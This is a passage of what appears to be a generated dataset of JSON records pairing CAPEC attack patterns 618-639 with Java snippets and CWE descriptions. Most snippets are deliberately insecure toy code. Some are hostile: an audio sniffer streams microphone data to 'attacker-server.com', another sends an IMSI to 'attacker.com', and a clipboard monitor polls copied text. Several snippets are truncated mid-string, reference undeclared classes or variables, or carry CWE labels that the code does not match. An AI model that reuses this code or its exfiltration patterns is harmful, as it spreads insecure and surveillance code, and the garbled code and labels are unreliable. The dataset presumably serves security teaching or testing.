        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class LocationVerifier {\n    public static void main(String[] args) throws Exception {\n        String targetPhoneNumber = \"1234567890\";\n        String lac = getLACFromPhoneNumber(targetPhoneNumber);\n        String broadcastMessage = \"Hello, this is a broadcast message!\";\n\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String sensitiveData = \"Target is in location: \" + lac;\n        broadcastMessage += sensitiveData;\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        Socket socket = new Socket(\"cellular-network.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(broadcastMessage.getBytes());\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        Socket incomingSocket = new ServerSocket(8081).accept();\n        InputStream inputStream = incomingSocket.getInputStream();\n        byte[] response = new byte[1024];\n        inputStream.read(response);\n        String responseMessage = new String(response);\n\n        // CWE-927: Use of Implicit Intent for Sensitive Communication (Android-specific, but conceptually similar)\n        // Intent intent = new Intent(\"com.example.ACTION_VERIFY_LOCATION\");\n        // intent.putExtra(\"location\", lac);\n        // sendBroadcast(intent);\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        Socket proxySocket = new Socket(\"proxy.com\", 8082);\n        outputStream = proxySocket.getOutputStream();\n        outputStream.write(responseMessage.getBytes());\n    }\n\n    private static String getLACFromPhoneNumber(String phoneNumber) {\n        // Simulate getting the Location Area Code (LAC) from the cellular network\n        return \"12345\";\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC attack scenario where an attacker uses knowledge of the target's mobile phone number to cause the cellular network to send broadcast messages to alert the mobile device. The code includes vulnerabilities related to CWE-201, CWE-924, CWE-940, CWE-927, and CWE-300, which can be exploited to compromise the security of the communication channel."
    },
    {
        "capec_id": "619",
        "code_snippet": "import java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class SignalTracker {\n    public static void main(String[] args) throws Exception {\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String sensitiveInfo = \"IMSI: 1234567890\";\n        String message = \"Signal strength: \" + getSignalStrength() + \" \" + sensitiveInfo;\n        sendSignalStrength(message);\n\n        // CWE-1300: Improper Protection of Physical Side Channels\n        // No protection mechanism to prevent physical side channels\n        // from exposing sensitive information\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the source of the communication channel\n        Socket socket = new Socket(\"attacker.com\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(message);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // No enforcement of message integrity during transmission\n        // Receive message from attacker.com without verifying its integrity\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String response = in.readLine();\n        System.out.println(response);\n\n        // CWE-432: Dangerous Signal Handler not Disabled During Sensitive Operations\n        // Signal handler not disabled during sensitive operations\n        Runtime.getRuntime().addShutdownHook(new Thread() {\n            public void run() {\n                System.out.println(\"Signal handler not disabled\");\n            }\n        });\n    }\n\n    public static String getSignalStrength() {\n        // Simulate getting signal strength from cellular RF signal or WiFi RF signal\n        return \"-50 dBm\";\n    }\n\n    public static void sendSignalStrength(String message) {\n        // Simulate sending signal strength to attacker.com\n        System.out.println(\"Sending signal strength: \" + message);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC attack scenario where an attacker passively monitors the signal strength of the target's cellular RF signal or WiFi RF signal to identify the source location of the signal. The code includes CWEs 201, 1300, 940, 924, and 432, which are related to the CAPEC. The code transmits sensitive information, lacks protection mechanisms for physical side channels, fails to verify the source of the communication channel, does not enforce message integrity during transmission, and uses a dangerous signal handler during sensitive operations."
    },
    {
        "capec_id": "620",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\n\npublic class InsecureEncryption {\n    public static void main(String[] args) throws Exception {\n        // CWE-311: Missing Encryption of Sensitive Data\n        String sensitiveData = \"confidential\";\n\n        // CWE-321: Use of Hard-coded Cryptographic Key\n        String hardCodedKey = \"my_secret_key\";\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(56); // CWE-326: Inadequate Encryption Strength\n        SecretKey secretKey = keyGen.generateKey();\n\n        // CWE-312: Cleartext Storage of Sensitive Information\n        System.out.println(\"Cleartext data: \" + sensitiveData);\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedData = cipher.doFinal(sensitiveData.getBytes());\n\n        System.out.println(\"Encrypted data: \" + new String(encryptedData));\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of forcing the encryption level to be lowered, making it vulnerable to attacks. It includes multiple CWEs, such as missing encryption of sensitive data, use of hard-coded cryptographic key, inadequate encryption strength, cleartext storage of sensitive information, and selection of less-secure algorithm during negotiation."
    },
    {
        "capec_id": "621",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\n\npublic class TimingAttack {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"example.com\", 8080);\n        DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String sensitiveData = \"username:password\";\n        dout.writeUTF(sensitiveData);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        dout.writeUTF(\"unencrypted_data\");\n\n        // CWE-385: Covert Timing Channel\n        for (int i = 0; i < 10; i++) {\n            dout.writeUTF(\"delayed_data\" + i);\n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n\n        // CWE-208: Observable Timing Discrepancy\n        long startTime = System.currentTimeMillis();\n        dout.writeUTF(\"slow_operation\");\n        long endTime = System.currentTimeMillis();\n        System.out.println(\"Operation took \" + (endTime - startTime) + \" milliseconds\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of intercepting and logging encrypted transmissions to analyze metadata. It includes CWE-201 by sending sensitive data, CWE-319 by transmitting unencrypted data, CWE-385 by introducing a covert timing channel through delayed data transmission, and CWE-208 by revealing the timing discrepancy of a slow operation."
    },
    {
        "capec_id": "622",
        "code_snippet": "public class VulnerableDevice {\n    private static final String SECRET_KEY = \"my_secret_key\";\n    private static final String DATA_TO_PROCESS = \"confidential_data\";\n\n    public static void processSensitiveData() {\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String dataToSend = DATA_TO_PROCESS + SECRET_KEY;\n        sendOverWirelessChannel(dataToSend);\n    }\n\n    public static void sendOverWirelessChannel(String data) {\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // No verification of endpoint identity or channel integrity\n        WirelessChannel channel = new WirelessChannel();\n        channel.send(data);\n    }\n\n    public static void performCryptographicOperation() {\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        // Using a weak cryptographic algorithm\n        WeakCrypto crypto = new WeakCrypto();\n        String encryptedData = crypto.encrypt(DATA_TO_PROCESS, SECRET_KEY);\n        processSensitiveData();\n    }\n\n    public static void main(String[] args) {\n        performCryptographicOperation();\n    }\n}\n\n// CWE-1300: Improper Protection of Physical Side Channels\n// CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n// No protection against electromagnetic emanations or fault injection attacks",
        "description": "This Java code snippet demonstrates a vulnerable device that processes sensitive data and transmits it over a wireless channel without proper protection. It uses a weak cryptographic algorithm, inserts sensitive information into sent data, and lacks protection against physical side channels and electromagnetic fault injection attacks."
    },
    {
        "capec_id": "623",
        "code_snippet": "public class EmanationLeak {\n    public static void main(String[] args) {\n        // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String sensitiveData = \"topSecretInformation\";\n        sendToDevice(sensitiveData);\n\n        // CWE-1300: Improper Protection of Physical Side Channels\n        // No protection against acoustic emissions\n        System.out.println(\"Device is processing: \" + sensitiveData);\n\n        // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n        // Untrusted agents can disable alerts about signal conditions exceeding limits\n        disableAlerts();\n\n        // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n        // Device is susceptible to electromagnetic fault injection attacks\n        processSensitiveData(sensitiveData);\n\n        // CWE-1420: Exposure of Sensitive Information during Transient Execution\n        // Processor event or prediction may allow incorrect operations to execute transiently\n        executeTransientOperation(sensitiveData);\n    }\n\n    private static void sendToDevice(String data) {\n        // Simulate sending data to device\n        System.out.println(\"Sending data to device: \" + data);\n    }\n\n    private static void disableAlerts() {\n        // Simulate disabling alerts\n        System.out.println(\"Alerts disabled\");\n    }\n\n    private static void processSensitiveData(String data) {\n        // Simulate processing sensitive data\n        System.out.println(\"Processing sensitive data: \" + data);\n    }\n\n    private static void executeTransientOperation(String data) {\n        // Simulate transient operation\n        System.out.println(\"Executing transient operation: \" + data);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of Compromising Emanations, where an attacker can intercept and analyze unintentional signals emitted by a device to disclose sensitive information. The code includes CWEs 201, 1300, 1320, 1319, and 1420, which represent various vulnerabilities that can be exploited to compromise the device's security."
    },
    {
        "capec_id": "624",
        "code_snippet": "public class VulnerableCryptoDevice {\n    private byte[] secretKey;\n    private boolean isSecureMode = true;\n\n    public VulnerableCryptoDevice(byte[] secretKey) {\n        this.secretKey = secretKey;\n    }\n\n    public void performCryptoOperation() {\n        if (isSecureMode) {\n            // Perform cryptographic operation\n            byte[] encryptedData = encryptData(secretKey);\n            System.out.println(\"Encrypted data: \" + encryptedData);\n        } else {\n            // Faulty behavior due to environmental factors\n            byte[] faultyData = new byte[secretKey.length];\n            System.arraycopy(secretKey, 0, faultyData, 0, secretKey.length);\n            System.out.println(\"Faulty data: \" + faultyData);\n        }\n    }\n\n    private byte[] encryptData(byte[] key) {\n        // Simulate cryptographic operation\n        return new byte[key.length];\n    }\n\n    public void setSecureMode(boolean secureMode) {\n        isSecureMode = secureMode;\n    }\n\n    public static void main(String[] args) {\n        VulnerableCryptoDevice device = new VulnerableCryptoDevice(new byte[] {1, 2, 3, 4, 5});\n        device.setSecureMode(false);\n        device.performCryptoOperation();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable cryptographic device that can be exploited through environmental factors such as voltage and clock glitches, electromagnetic pulses, or extreme temperatures. The device has a faulty behavior when operating in an insecure mode, which can be triggered by altering the physical environment. In this mode, the device leaks the secret key information, making it vulnerable to attacks. The code embodies CWEs 1247, 1248, 1256, 1319, 1332, 1334, 1338, and 1351."
    },
    {
        "capec_id": "625",
        "code_snippet": "public class VulnerableCryptoDevice {\n    private byte[] secretKey;\n    private boolean isSecureMode = true;\n\n    public VulnerableCryptoDevice(byte[] secretKey) {\n        this.secretKey = secretKey;\n    }\n\n    public void performCryptoOperation() {\n        if (isSecureMode) {\n            // No protection against voltage and clock glitches (CWE-1247)\n            // No protection against electromagnetic fault injection (CWE-1319)\n            // No handling of faults that lead to instruction skips (CWE-1332)\n            // No protection against hardware overheating (CWE-1338)\n            // No handling of hardware behavior in exceptionally cold environments (CWE-1351)\n            // No restriction of software interfaces to hardware features (CWE-1256)\n            // No protection against semiconductor defects in hardware logic (CWE-1248)\n            // No protection against unauthorized error injection (CWE-1334)\n            try {\n                // Perform cryptographic operation\n                byte[] encryptedData = encryptData(secretKey);\n                System.out.println(\\",
        "description": "This Java code snippet represents a vulnerable cryptographic device that is susceptible to fault injection attacks. It lacks protection against various hardware and software vulnerabilities, including voltage and clock glitches, electromagnetic fault injection, instruction skips, hardware overheating, and semiconductor defects. The device also fails to properly restrict software interfaces to hardware features and handle errors securely, making it vulnerable to unauthorized error injection and information leakage."
    },
    {
        "capec_id": "626",
        "code_snippet": "import java.awt.AWTException;\nimport java.awt.Robot;\nimport java.awt.event.InputEvent;\nimport java.awt.event.KeyEvent;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class TouchScreenPatternDetector {\n    public static void main(String[] args) {\n        try {\n            Robot robot = new Robot();\n            // Simulate user interaction to capture touchscreen pattern\n            robot.mouseMove(100, 100);\n            robot.mousePress(InputEvent.BUTTON1_MASK);\n            robot.mouseRelease(InputEvent.BUTTON1_MASK);\n            // Capture oil smudges left behind by the user\u2019s fingers\n            // using image processing techniques\n            String pattern = captureSmudgePattern();\n            // Replay the captured pattern to impersonate the user\n            replayPattern(pattern);\n        } catch (AWTException ex) {\n            Logger.getLogger(TouchScreenPatternDetector.class.getName()).log(Level.SEVERE, null, ex);\n        }\n    }\n\n    private static String captureSmudgePattern() {\n        // Implement image processing to capture oil smudges\n        // and return the pattern as a string\n        return \\",
        "description": "This Java code snippet demonstrates a touchscreen pattern detector that captures oil smudges left behind by the user\u2019s fingers and replays the pattern to impersonate the user, bypassing authentication. The code uses the Robot class to simulate user interaction and image processing techniques to capture the smudge pattern. This code embodies the CAPEC of attacks that reveal the password/passcode pattern on a touchscreen device by detecting oil smudges, and is related to CWEs 1300, 301, 1278, 294, and 1125."
    },
    {
        "capec_id": "627",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class GPSReceiver {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(8080);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String message = new String(packet.getData(), 0, packet.getLength());\n            // CWE-940: No verification of the source of the communication channel\n            // CWE-924: No message integrity check during transmission\n            processGPSMessage(message);\n        }\n    }\n\n    public static void processGPSMessage(String message) {\n        // CWE-222: Truncation of security-relevant information\n        if (message.length() > 100) {\n            message = message.substring(0, 100);\n        }\n        // CWE-925: No verification of intent by broadcast receiver\n        // CWE-294: Authentication bypass by capture-replay\n        if (message.contains(\"GPS_DATA\")) {\n            // Process GPS data without verifying its authenticity\n            System.out.println(\"Received GPS data: \" + message);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable GPS receiver that is susceptible to GPS spoofing attacks. The receiver does not verify the source of the incoming GPS signals, does not ensure message integrity during transmission, truncates security-relevant information, and does not properly verify the intent of the received messages. An adversary can exploit these weaknesses to broadcast counterfeit GPS signals, causing the receiver to estimate its position incorrectly."
    },
    {
        "capec_id": "628",
        "code_snippet": "public class GPSReceiver {\n    private String gpsSignal;\n    private double signalPower;\n    private String targetLocation;\n\n    public GPSReceiver(String gpsSignal, double signalPower, String targetLocation) {\n        this.gpsSignal = gpsSignal;\n        this.signalPower = signalPower;\n        this.targetLocation = targetLocation;\n    }\n\n    public void receiveSignal(String signal) {\n        // CWE-290: Authentication Bypass by Spoofing\n        // No authentication or verification of the signal source\n        if (signal.equals(gpsSignal)) {\n            // CWE-940: Improper Verification of Source of a Communication Channel\n            // No verification of the signal origin\n            processSignal(signal);\n        }\n    }\n\n    public void processSignal(String signal) {\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // No validation of the destination location\n        targetLocation = signal.substring(0, 10);\n        System.out.println(\\",
        "description": "This Java code snippet demonstrates a GPS receiver that is vulnerable to a carry-off attack. The receiveSignal method does not authenticate or verify the source of the incoming signal, allowing an adversary to spoof the signal. The processSignal method updates the target location without validating the destination, and the displayLocation method truncates the location information, obscuring the source of the attack. The main method demonstrates how an adversary can gradually increase the power of the counterfeit signal and carry the target away from their intended destination."
    },
    {
        "capec_id": "629",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class VulnerableCode {\n    private static final String AUX_DEVICE = \"AUX\";\n    private static final String CON_DEVICE = \"CON\";\n\n    public static void main(String[] args) {\n        String userInput = \"AUX:\\\\path\\\\to\\\\file.txt\";\n        File file = new File(userInput);\n        if (file.exists()) {\n            try (FileWriter writer = new FileWriter(file)) {\n                writer.write(\"This is a vulnerable file.\");\n            } catch (IOException e) {\n                System.out.println(\"Error writing to file.\");\n            }\n        } else {\n            System.out.println(\"File does not exist.\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable code that embodies the main idea of the deprecated CAPEC. It combines concepts from CWE-67, CWE-592, CWE-772, CWE-863, and CWE-920. The code does not properly handle Windows device names, allowing an attacker to cause a denial of service or information exposure. It also fails to release resources after their effective lifetime, leading to potential power consumption issues. Furthermore, the code does not correctly perform authorization checks, allowing attackers to bypass intended access restrictions. Finally, the code does not restrict power consumption, which can be a problem in environments where power is a limited resource."
    },
    {
        "capec_id": "630",
        "code_snippet": "public class TypoSquattingAttack {\n    public static void main(String[] args) {\n        String userInput = \"www.goggle.com\";\n        String trustedDomain = \"www.google.com\";\n\n        // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n        if (userInput.contains(\".\")) {\n            String redirectUrl = \"http://\" + userInput;\n            // Redirect user to adversary-controlled destination\n            System.out.println(\"Redirecting to: \" + redirectUrl);\n        }\n\n        // CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n        String maliciousUrl = \"http://www.gooogle.com\";\n        if (maliciousUrl.contains(trustedDomain)) {\n            // CWE-290: Authentication Bypass by Spoofing\n            System.out.println(\"Authenticating with: \" + maliciousUrl);\n        }\n\n        // CWE-697: Incorrect Comparison\n        if (userInput.equalsIgnoreCase(trustedDomain)) {\n            System.out.println(\"Login successful!\");\n        } else {\n            System.out.println(\"Invalid login credentials.\");\n        }\n\n        // CWE-115: Misinterpretation of Input\n        String input = \"<script>alert('XSS')</script>\";\n        System.out.println(\"User input: \" + input);\n    }\n}",
        "description": "This Java code snippet demonstrates a TypoSquatting attack, where an adversary registers a domain name similar to a trusted domain. The code includes vulnerabilities related to CWE-601 (URL Redirection to Untrusted Site), CWE-86 (Improper Neutralization of Invalid Characters in Identifiers in Web Pages), CWE-290 (Authentication Bypass by Spoofing), CWE-697 (Incorrect Comparison), and CWE-115 (Misinterpretation of Input)."
    },
    {
        "capec_id": "631",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.IOException;\n\npublic class SoundSquattingAttack {\n    public static void main(String[] args) throws IOException {\n        String userInput = \"https://paypal.com\";\n        String adversaryDomain = \"https://paypa1.com\";\n        if (userInput.equalsIgnoreCase(adversaryDomain.replace(\"1\", \"l\"))) {\n            URL url = new URL(adversaryDomain);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setInstanceFollowRedirects(true);\n            connection.connect();\n            System.out.println(\"Redirecting to: \" + connection.getURL());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a SoundSquatting attack. It takes a user-input URL and compares it to a malicious domain name that sounds similar but has a different spelling. If the two URLs are deemed similar, the code redirects the user to the malicious domain, potentially leading to phishing or other attacks. The code embodies CWE-348 by using a less trusted source (the user-input URL), CWE-486 by comparing classes by name (using the equalsIgnoreCase method), CWE-601 by redirecting to an untrusted site, CWE-350 by relying on reverse DNS resolution, and CWE-290 by allowing authentication bypass through spoofing."
    },
    {
        "capec_id": "632",
        "code_snippet": "import java.net.URL;\nimport java.net.URLEncoder;\nimport java.util.regex.Pattern;\n\npublic class HomographAttack {\n    public static void main(String[] args) throws Exception {\n        String trustedDomain = \"example.com\";\n        String homoglyphDomain = \"ex\u0430mple.com\"; // using Cyrillic '\u0430' instead of Latin 'a'\n        String userInput = \"http://\" + homoglyphDomain + \"/phishing_page\";\n\n        // CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page\n        String encodedUserInput = URLEncoder.encode(userInput, \"UTF-8\");\n\n        // CWE-777: Regular Expression without Anchors\n        String regex = \"^http://[a-zA-Z0-9.]+\";\n        if (Pattern.matches(regex, encodedUserInput)) {\n            // CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n            URL url = new URL(encodedUserInput);\n            // CWE-918: Server-Side Request Forgery (SSRF)\n            Object content = url.getContent();\n            System.out.println(\"Redirecting to: \" + content);\n        } else {\n            System.out.println(\"Invalid input\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a homograph attack, where a malicious domain 'ex\u0430mple.com' (using Cyrillic '\u0430' instead of Latin 'a') is registered to appear similar to a trusted domain 'example.com'. The code improperly neutralizes user-controlled input, allowing the malicious domain to be treated as the trusted domain. This can lead to phishing attacks, SSRF, and other security vulnerabilities."
    },
    {
        "capec_id": "633",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AuthenticationExploit {\n    private static Map<String, String> tokens = new HashMap<>();\n\n    public static void main(String[] args) {\n        // CWE-287: Improper Authentication\n        String username = \"admin\";\n        String token = generateToken(username);\n        tokens.put(username, token);\n\n        // CWE-1270: Generation of Incorrect Security Tokens\n        String impersonatedToken = generateToken(\"attacker\");\n        tokens.put(\"admin\", impersonatedToken);\n\n        // CWE-1390: Weak Authentication\n        authenticateAndPerformAction(impersonatedToken);\n    }\n\n    private static String generateToken(String username) {\n        // CWE-1259: Improper Restriction of Security Token Assignment\n        return username + \"_token\";\n    }\n\n    private static void authenticateAndPerformAction(String token) {\n        // CWE-520: .NET Misconfiguration: Use of Impersonation (equivalent in Java)\n        System.setProperty(\"java.security.auth.login.config\", \"myLoginConfig\");\n        // Perform action as impersonated user\n        System.out.println(\"Performing action as \" + token);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC, where an adversary exploits a weakness in authentication to create an access token that impersonates a different entity. The code generates an incorrect security token, uses weak authentication, and improperly restricts security token assignment, ultimately leading to an impersonated user performing an action."
    },
    {
        "capec_id": "634",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport javax.sound.sampled.AudioFormat;\nimport javax.sound.sampled.AudioInputStream;\nimport javax.sound.sampled.AudioSystem;\nimport javax.sound.sampled.DataLine;\nimport javax.sound.sampled.TargetDataLine;\n\npublic class AudioSniffer {\n    public static void main(String[] args) throws LineUnavailableException, IOException {\n        TargetDataLine line = AudioSystem.getTargetDataLine(new AudioFormat(44100, 16, 2, true, false));\n        line.open();\n        line.start();\n\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"attacker-server.com\");\n\n        byte[] buffer = new byte[1024];\n        while (true) {\n            int numBytesRead = line.read(buffer, 0, buffer.length);\n            DatagramPacket packet = new DatagramPacket(buffer, numBytesRead, address, 12345);\n            socket.send(packet);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious audio sniffer that captures audio input from the system's microphone and transmits it to a remote server in cleartext, violating CWE-319. The code uses a TargetDataLine to capture audio input and a DatagramSocket to send the data to the remote server. The code runs with elevated privileges, violating CWE-267, and does not implement any protection mechanisms to prevent physical side channels, violating CWE-1300. Additionally, the code does not properly handle adversarial input perturbations, violating CWE-1039, and exposes sensitive system information to an unauthorized control sphere, violating CWE-497."
    },
    {
        "capec_id": "635",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class FileHandler {\n    public void handleFile(String filename) throws IOException {\n        String extension = filename.substring(filename.lastIndexOf('.'));\n        if (extension.equals(\".txt\")) {\n            // Open the file with a text editor\n            Runtime.getRuntime().exec(\"notepad.exe \" + filename);\n        } else if (extension.equals(\".pdf\")) {\n            // Open the file with a PDF viewer\n            Runtime.getRuntime().exec(\"acroread.exe \" + filename);\n        }\n    }\n\n    public static void main(String[] args) throws IOException {\n        FileHandler handler = new FileHandler();\n        handler.handleFile(\"user-inputted-file.txt\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of relying on file extensions to determine the application used to open a file. The code uses the CWE-162 vulnerability by not properly neutralizing the trailing special elements in the file name. It also embodies CWE-646 by relying on the file name or extension to determine the appropriate behavior. Additionally, it relates to CWE-641, CWE-73, and CWE-58 as it constructs the file name using user input and does not restrict the resulting name, allowing an attacker to control the file name or path. An attacker could exploit this by providing a malicious file with a spoofed extension, causing the system to open it with a different application and potentially leading to code execution or sensitive information exposure."
    },
    {
        "capec_id": "636",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Base64;\n\npublic class MaliciousFileStorage {\n    public static void main(String[] args) throws IOException {\n        String maliciousCode = \"<malicious_code_here>\";\n        String filePath = \"image.jpg\";\n        File file = new File(filePath);\n        byte[] fileContent = Files.readAllBytes(file.toPath());\n        byte[] maliciousCodeBytes = maliciousCode.getBytes();\n        byte[] combinedBytes = new byte[fileContent.length + maliciousCodeBytes.length];\n        System.arraycopy(fileContent, 0, combinedBytes, 0, fileContent.length);\n        System.arraycopy(maliciousCodeBytes, 0, combinedBytes, fileContent.length, maliciousCodeBytes.length);\n        Files.write(file.toPath(), combinedBytes, StandardOpenOption.WRITE);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of storing malicious data or code in a file, leveraging CWEs 506, 219, 313, 318, and 515. It appends malicious code to an image file, making it difficult to discover. The malicious code is stored in cleartext, violating CWEs 313 and 318. The file is stored under the web document root with insufficient access control, making it accessible to untrusted parties (CWE 219). The code uses a covert storage channel to convey encoded information (CWE 515)."
    },
    {
        "capec_id": "637",
        "code_snippet": "import java.awt.Toolkit;\nimport java.awt.datatransfer.Clipboard;\nimport java.awt.datatransfer.DataFlavor;\nimport java.awt.datatransfer.StringSelection;\nimport java.awt.datatransfer.UnsupportedFlavorException;\nimport java.io.IOException;\n\npublic class ClipboardSniffer {\n    public static void main(String[] args) {\n        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();\n        StringSelection selection = new StringSelection(\"initial value\");\n        clipboard.setContents(selection, selection);\n\n        while (true) {\n            try {\n                String clipboardContent = (String) clipboard.getData(DataFlavor.stringFlavor);\n                System.out.println(\"Clipboard content: \" + clipboardContent);\n                // Store sensitive information in cleartext in GUI\n                System.out.println(\"Username: \" + getStoredUsername());\n                System.out.println(\"Password: \" + getStoredPassword());\n                // Perform unsafe actions with elevated privileges\n                performAdminAction(clipboardContent);\n            } catch (IOException | UnsupportedFlavorException e) {\n                e.printStackTrace();\n            }\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    // CWE-317: Cleartext Storage of Sensitive Information in GUI\n    public static String getStoredUsername() {\n        return \"admin\";\n    }\n\n    public static String getStoredPassword() {\n        return \"password123\";\n    }\n\n    // CWE-267: Privilege Defined With Unsafe Actions\n    public static void performAdminAction(String clipboardContent) {\n        System.out.println(\"Performing admin action with clipboard content: \" + clipboardContent);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting an application that allows for the copying of sensitive data or information by collecting information copied to the clipboard. The code continuously monitors the system clipboard and prints out any copied text. It also stores sensitive information (username and password) in cleartext within the GUI and performs unsafe actions with elevated privileges. This code embodies CWE-267, CWE-317, CWE-318, CWE-222, and CWE-497."
    },
    {
        "capec_id": "638",
        "code_snippet": "public class MaliciousFirmwareUpdater {\n    public static void main(String[] args) {\n        // CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n        boolean isFabricAccessControlEnabled = false;\n        executeUntrustedFirmware(!isFabricAccessControlEnabled);\n\n        // CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n        byte[] bootloaderCode = readBootloaderCodeFromNVM();\n        writeBootloaderCodeToVM(bootloaderCode);\n\n        // CWE-1277: Firmware Not Updateable\n        boolean isFirmwareUpdateAvailable = false;\n        if (!isFirmwareUpdateAvailable) {\n            System.out.println(\"Firmware update not available. Vulnerable to attacks.\");\n        }\n\n        // CWE-1326: Missing Immutable Root of Trust in Hardware\n        boolean isImmutableRootOfTrustEnabled = false;\n        if (!isImmutableRootOfTrustEnabled) {\n            executeUntrustedBootCode();\n        }\n\n        // CWE-1220: Insufficient Granularity of Access Control\n        accessControlPolicy = new AccessControlPolicy();\n        accessControlPolicy.setAccessControlEnabled(false);\n    }\n\n    private static void executeUntrustedFirmware(boolean isFabricAccessControlEnabled) {\n        // Execute untrusted firmware code\n        System.out.println(\"Executing untrusted firmware code...\");\n    }\n\n    private static void writeBootloaderCodeToVM(byte[] bootloaderCode) {\n        // Write bootloader code to volatile memory\n        System.out.println(\"Writing bootloader code to volatile memory...\");\n    }\n\n    private static void executeUntrustedBootCode() {\n        // Execute untrusted boot code\n        System.out.println(\"Executing untrusted boot code...\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting systems features and/or improperly protected firmware of hardware components, such as Hard Disk Drives (HDD), to execute malicious code from within the component's Master Boot Record (MBR). The code includes vulnerabilities related to CWE-1193, CWE-1274, CWE-1277, CWE-1326, and CWE-1220, which can be exploited by an adversary to infect the target with firmware altering malware and obtain persistence within the victim system."
    },
    {
        "capec_id": "639",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class InsecureFileAccess {\n    public static void main(String[] args) {\n        try {\n            File file = new File(\"sensitive_data.txt\");\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n            FileWriter writer = new FileWriter(file);\n            writer.write(\"username:password\\n\");\n            writer.close();\n        } catch (IOException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of improperly protected files, allowing unauthorized access to sensitive information. The code creates a file named 'sensitive_data.txt' in the current directory with a username and password, without any access control or encryption. The file is world-readable, making it accessible to external parties (CWE-552). Additionally, the code does not properly handle exceptions, potentially revealing sensitive system information in the error message (CWE-537)."
    },
    {
        "capec_id": "640",
